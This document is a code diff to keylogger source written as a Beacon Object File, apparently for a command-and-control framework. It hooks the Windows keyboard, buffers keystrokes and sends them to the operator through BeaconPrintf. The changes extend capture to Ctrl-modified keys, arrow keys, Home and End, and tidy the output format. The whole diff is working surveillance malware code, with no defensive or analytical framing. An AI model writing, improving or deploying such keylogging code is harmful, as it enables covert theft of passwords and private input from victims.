@@ -90,7 +90,7 @@ VOID LogKey(const char* str) {
 VOID FlushBuffer(VOID) {
     if (gPos > 0) {
         gBuffer[gPos] = '\0';
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured keystrokes:\n\n%s\n\n", gBuffer);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured keystrokes: %s", gBuffer);
         BeaconWakeup();
         MSVCRT$memset(gBuffer, 0, KEY_BUFFER_SIZE);
         gPos = 0;
@@ -135,19 +135,18 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             return USER32$CallNextHookEx(hHook, nCode, wParam, lParam);
         }
 
+        BOOL ctrl = (USER32$GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (USER32$GetAsyncKeyState(VK_RCONTROL) & 0x8000);
         switch (kb->vkCode) {
-            case VK_RETURN:   
-                LogKey("[ENTER]\n"); break;
-            case VK_BACK:     
-                LogKey("[BACK]"); break;
-            case VK_TAB:      
-                LogKey("[TAB]"); break;
-            case VK_DELETE:   
-                LogKey("[DEL]"); break;
-            case VK_ESCAPE:   
-                LogKey("[ESC]"); break;
-            case VK_SPACE:    
-                LogKey(" "); break;
+            case VK_RETURN:     LogKey("[ENTER]");                              break;
+            case VK_BACK:       LogKey(ctrl ? "[CTRL+BACK]" : "[BACK]");        break;
+            case VK_TAB:        LogKey("[TAB]");                                break;
+            case VK_DELETE:     LogKey(ctrl ? "[CTRL+DEL]" : "[DEL]");          break;
+            case VK_ESCAPE:     LogKey("[ESC]");                                break;
+            case VK_SPACE:      LogKey(" ");                                    break;
+            case VK_LEFT:       LogKey(ctrl ? "[CTRL+LEFT]" : "[LEFT]");        break;
+            case VK_RIGHT:      LogKey(ctrl ? "[CTRL+RIGHT]" : "[RIGHT]");      break;
+            case VK_HOME:       LogKey("[HOME]");                               break;
+            case VK_END:        LogKey("[END]");                                break;
             case VK_LSHIFT:
             case VK_RSHIFT:
             case VK_LCONTROL:
@@ -216,6 +215,7 @@ _MONITOR:
         }
     }
 
+    // Uninstall keyboard hook
     USER32$UnhookWindowsHookEx(hHook);
     hHook = NULL;
 
@@ -224,7 +224,6 @@ _MONITOR:
 
 _CLEANUP:
 
-    // Uninstall keyboard hook
     if (hHook) {
         USER32$UnhookWindowsHookEx(hHook);
         hHook = NULL;
